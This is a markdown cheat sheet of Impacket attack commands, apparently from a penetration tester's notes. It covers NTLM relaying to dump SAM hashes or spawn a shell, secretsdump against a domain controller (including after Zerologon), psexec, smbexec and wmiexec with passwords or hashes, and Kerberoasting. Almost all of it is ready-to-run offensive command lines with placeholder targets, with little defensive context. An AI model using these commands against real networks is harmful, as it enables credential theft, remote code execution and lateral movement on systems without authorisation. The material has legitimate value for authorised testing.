---
title: IMPACKET
summary: A collection of Python classes for working with network protocols.
description: A collection of Python classes for working with network protocols.
---

**[https://github.com/fortra/impacket](https://github.com/fortra/impacket)**

## IMPACKET List of Tools

**https://tools.thehacker.recipes/impacket**

## IMPACKET SMB Server


 > 
 > **<font color=red>python3 /opt/impacket/examples/smbserver.py</font> myShareName /path/to/folder/ <font color=red>-smb2support</font>**</br>
 > Set up an SMB share.

## IMPACKET NTML Relay


 > 
 > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf </font>myTargets.txt <font color=red>-smb2support --no-multirelay</font>**</br>
 > Relay NTLM Hash and Dump Sam Hashes.

![tool-ntlmrelayx-smb_relay_dump_sam.png.png](../../attachments/tool-ntlmrelayx-smb_relay_dump_sam.png.png)

\** /!\ TO CHECK /!\ **

 > 
 > **<font color=red>python3 /opt/impacket/examples/ntlmrelayx.py -tf</font> myTargets.txt <font color=red>-smb2support --no-multirelay -i</font>**</br>
 > Relay NTLM Hash and start a Bind Shell.

![tool-ntmlrelayx-smb_relay_reverse_shell.png](../../attachments/tool-ntmlrelayx-smb_relay_reverse_shell.png)

 > 
 > **<font color=red>nc 127.0.0.1 11000</font>**
 > Connect to the shell.


 > 
 > **<font color=red>-tf</font>**</br>
 > Target File.
 > 
 > **<font color=red>-i</font>**</br>
 > Interactive (spawn a shell).

 > 
 > **<font color=red>--no-multirelay</font>**</br>
 > Required because of new protection (https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default).

## IMPACKET Hash Dump


 > 
 > **<font color=red>python3 /opt/impacket/examples/secretsdump.py</font> myDomain<font color=red>/</font>myUser<font color=red>:</font>myPass<font color=red>@</font>\[TARGET_DC_IP\]**</br>
 > Connect to the target and dump hashes. 


 > 
 > **<font color=red>python3 /opt/impacket/examples/secretsdump.py </font>myNetBIOSDCName<font color=red>\\$@</font>\[TARGET_DC_IP\] <font color=red>-no-pass</font>**</br>
 > Connect with empty password (after Zerologon exploit) and dump hashes. 

## IMPACKET Pass the Password


 > 
 > **<font color=red>python3 /opt/impacket/examples/psexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine (Psexec is the most noisy).

 > 
 > **<font color=red>python3 /opt/impacket/examples/smbexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine.

 > 
 > **<font color=red>python3 /opt/impacket/examples/wmiexec.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>mySamName<font color=red>:</font>myPassword<font color=red>@</font>\[TARGET_IP\]**</br>
 > Get a shell on the tageted machine.

## IMPACKET Pass the Hash (LM+NT)


 > 
 > **<font color=red>python3 /opt/impacket/examples/psexec.py </font>\[TARGET_DOMAIN\]<font color=red>/</font>\[mySamName\]<font color=red>@</font>\[TARGET_IP\] <font color=red>-hashes</font> \[myUserLMHASH\]<font color=red>:</font>\[myUserNTHASH\]**</br>
 > Pass the Hash attack (LM+NT).

## IMPACKET Kerberoastable


 > 
 > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> \[TARGET_DOMAIN\]<font color=red>/</font>\[VALID_USER\]<font color=red>:</font>\[VALID_PASSWORD\] <font color=red>-dc-ip</font> \[DOMAIN_CONTROLLER_IP\] <font color=red>-request</font>**</br>
 > Dump Kerberos hash of kerberoastable users.
